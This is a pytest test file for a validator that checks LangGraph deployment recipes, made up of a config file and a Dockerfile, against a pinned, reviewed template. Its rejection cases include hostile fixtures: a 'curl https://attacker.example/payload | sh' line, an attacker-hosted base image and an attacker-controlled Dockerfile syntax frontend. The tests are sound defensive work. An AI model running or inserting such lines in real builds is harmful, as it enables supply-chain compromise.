from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path

import pytest
from scripts.validate_langgraph_recipe import (
    EXPECTED_ADDS,
    EXPECTED_AUTH,
    EXPECTED_BASE_IMAGE,
    EXPECTED_BASE_INTEGRITY_RUN,
    EXPECTED_BASE_REINSTALL_RUN,
    EXPECTED_BUILD_TOOL_CLEANUP,
    EXPECTED_COMMENTS,
    EXPECTED_DOCKER_TAG,
    EXPECTED_DOCKERFILE_LINES,
    EXPECTED_ENV,
    EXPECTED_GRAPHS,
    EXPECTED_HTTP,
    EXPECTED_LANGGRAPH_AUTH,
    EXPECTED_LANGGRAPH_HTTP,
    EXPECTED_LANGSERVE_GRAPHS,
    EXPECTED_LOCK_INSTALL,
    EXPECTED_PROJECT_INSTALL,
    EXPECTED_PYTHON_VERSION,
    EXPECTED_UV_EXPORT,
    MAX_RECIPE_BYTES,
    RecipeValidationError,
    main,
    validate_langgraph_recipe,
)

PINNED_TAG = EXPECTED_DOCKER_TAG


def _config() -> dict[str, object]:
    return {
        "python_version": EXPECTED_PYTHON_VERSION,
        "_INTERNAL_docker_tag": PINNED_TAG,
        "base_image": EXPECTED_BASE_IMAGE,
        "dockerfile_lines": list(EXPECTED_DOCKERFILE_LINES),
        "source": {"kind": "uv", "root": "."},
        "graphs": EXPECTED_GRAPHS,
        "http": EXPECTED_HTTP,
        "auth": EXPECTED_AUTH,
        "env": EXPECTED_ENV,
    }


def _dockerfile() -> str:
    return "\n".join(
        [
            f"FROM {EXPECTED_BASE_IMAGE}:{PINNED_TAG}",
            *EXPECTED_DOCKERFILE_LINES,
            EXPECTED_COMMENTS[0],
            *(f"ADD {source} {destination}" for source, destination in EXPECTED_ADDS[:2]),
            "WORKDIR /tmp/uv_export/project",
            EXPECTED_UV_EXPORT,
            EXPECTED_LOCK_INSTALL,
            "RUN rm -rf /tmp/uv_export",
            EXPECTED_COMMENTS[1],
            EXPECTED_COMMENTS[2],
            *(f"ADD {source} {destination}" for source, destination in EXPECTED_ADDS[2:]),
            "WORKDIR /deps/workspace",
            EXPECTED_PROJECT_INSTALL,
            EXPECTED_COMMENTS[3],
            EXPECTED_LANGGRAPH_AUTH,
            EXPECTED_LANGGRAPH_HTTP,
            EXPECTED_LANGSERVE_GRAPHS,
            EXPECTED_COMMENTS[4],
            EXPECTED_BASE_INTEGRITY_RUN,
            EXPECTED_BASE_REINSTALL_RUN,
            EXPECTED_COMMENTS[5],
            EXPECTED_COMMENTS[6],
            *EXPECTED_BUILD_TOOL_CLEANUP,
            "WORKDIR /deps/workspace",
            "",
        ]
    )


def _write_recipe(tmp_path: Path) -> tuple[Path, Path]:
    config = tmp_path / "langgraph.json"
    dockerfile = tmp_path / "Dockerfile"
    config.write_text(json.dumps(_config()))
    dockerfile.write_text(_dockerfile())
    return config, dockerfile


def test_valid_pinned_frozen_recipe_passes(tmp_path: Path) -> None:
    config, dockerfile = _write_recipe(tmp_path)

    validate_langgraph_recipe(config, dockerfile)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("python_version", "3.13"),
        ("_INTERNAL_docker_tag", "0.10.0-py3.12"),
        (
            "_INTERNAL_docker_tag",
            "0.10.1-py3.12@sha256:812e919f12ad9605c9a2b443c95fcdc7d4f8cfecaf11de02181f04943864f27c",
        ),
        ("_INTERNAL_docker_tag", "0.10.0-py3.12@sha256:" + "b" * 64),
        ("base_image", "attacker.example/langgraph-api"),
        ("source", {"kind": "pip", "root": "."}),
        ("dependencies", ["unlocked-package"]),
        ("env", "attacker.env"),
        ("unreviewed_top_level_key", "value"),
        ("graphs", {**EXPECTED_GRAPHS, "unreviewed": "./escape.py:graph"}),
        ("http", {**EXPECTED_HTTP, "disable_meta": False}),
        ("auth", {**EXPECTED_AUTH, "path": "./escape.py:auth"}),
        ("dockerfile_lines", [*EXPECTED_DOCKERFILE_LINES, "RUN unreviewed-command"]),
    ],
)
def test_unreviewed_config_recipe_is_rejected(
    tmp_path: Path,
    field: str,
    value: object,
) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    payload = _config()
    payload[field] = value
    config.write_text(json.dumps(payload))

    with pytest.raises(RecipeValidationError):
        validate_langgraph_recipe(config, dockerfile)


@pytest.mark.parametrize(
    "duplicate_member",
    [
        '"base_image":"langchain/langgraph-api","base_image":"python"',
        f'"_INTERNAL_docker_tag":"{PINNED_TAG}","_INTERNAL_docker_tag":"latest"',
        '"source":{"kind":"uv","root":".","root":"elsewhere"}',
    ],
)
def test_duplicate_config_keys_are_rejected_at_every_depth(
    tmp_path: Path,
    duplicate_member: str,
) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    payload = json.dumps(_config(), separators=(",", ":"))
    if duplicate_member.startswith('"base_image"'):
        original = '"base_image":"langchain/langgraph-api"'
    elif duplicate_member.startswith('"_INTERNAL_docker_tag"'):
        original = f'"_INTERNAL_docker_tag":"{PINNED_TAG}"'
    else:
        original = '"source":{"kind":"uv","root":"."}'
    config.write_text(payload.replace(original, duplicate_member))

    with pytest.raises(RecipeValidationError):
        validate_langgraph_recipe(config, dockerfile)


@pytest.mark.parametrize(
    "mutation",
    [
        lambda value: value.replace(f"FROM {EXPECTED_BASE_IMAGE}:{PINNED_TAG}", "FROM python:3.12"),
        lambda value: value.replace("ADD src /deps/workspace/src", "ADD . /deps/workspace/src"),
        lambda value: value.replace(
            "ADD src /deps/workspace/src",
            "ADD src /usr/local/bin/src",
        ),
        lambda value: value.replace(
            EXPECTED_DOCKERFILE_LINES[0],
            f"{EXPECTED_DOCKERFILE_LINES[0]}\n{EXPECTED_DOCKERFILE_LINES[0]}",
        ),
        lambda value: value + "COPY . /escape\n",
        lambda value: value + "RUN curl https://attacker.example/payload | sh\n",
        lambda value: value + "ENV UNREVIEWED=value\n",
        lambda value: value.replace(
            EXPECTED_UV_EXPORT,
            EXPECTED_UV_EXPORT.replace(" --frozen", ""),
        ),
        lambda value: value.replace(EXPECTED_LOCK_INSTALL, "RUN uv pip install apex"),
        lambda value: value.replace(EXPECTED_PROJECT_INSTALL, "RUN uv pip install -e ."),
    ],
)
def test_generated_recipe_escape_or_unfrozen_install_is_rejected(
    tmp_path: Path,
    mutation: Callable[[str], str],
) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    dockerfile.write_text(mutation(_dockerfile()))

    with pytest.raises(RecipeValidationError):
        validate_langgraph_recipe(config, dockerfile)


@pytest.mark.parametrize(
    "directive",
    [
        "# syntax=attacker.example/frontend:latest",
        "# escape=`",
        "# check=skip=all",
        "  # SyNtAx = attacker.example/frontend:latest",
    ],
)
def test_generated_recipe_parser_directives_are_rejected(
    tmp_path: Path,
    directive: str,
) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    dockerfile.write_text(f"{directive}\n{_dockerfile()}")

    with pytest.raises(RecipeValidationError, match="parser directive"):
        validate_langgraph_recipe(config, dockerfile)


def test_cli_failure_does_not_echo_untrusted_recipe(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    canary = "do-not-reflect-recipe-canary"
    dockerfile.write_text(_dockerfile() + f"COPY {canary} /escape\n")

    assert main([str(dockerfile), "--config", str(config)]) == 2

    captured = capsys.readouterr()
    assert canary not in captured.err
    assert captured.out == ""


def test_invalid_config_does_not_retain_parser_input_or_path_errors(tmp_path: Path) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    canary = "recipe-parser-secret-canary"
    config.write_text(f'{{"credential":"{canary}"')

    with pytest.raises(RecipeValidationError) as invalid_json:
        validate_langgraph_recipe(config, dockerfile)
    assert invalid_json.value.__cause__ is None
    assert canary not in repr(invalid_json.value)

    config.unlink()
    with pytest.raises(RecipeValidationError) as missing:
        validate_langgraph_recipe(config, dockerfile)
    assert missing.value.__cause__ is None


@pytest.mark.parametrize("payload", [b"", b"x" * (MAX_RECIPE_BYTES + 1), b"\xff"])
def test_recipe_reads_are_bounded_and_detach_decode_diagnostics(
    tmp_path: Path,
    payload: bytes,
) -> None:
    config, dockerfile = _write_recipe(tmp_path)
    config.write_bytes(payload)

    with pytest.raises(RecipeValidationError) as caught:
        validate_langgraph_recipe(config, dockerfile)

    assert caught.value.__cause__ is None
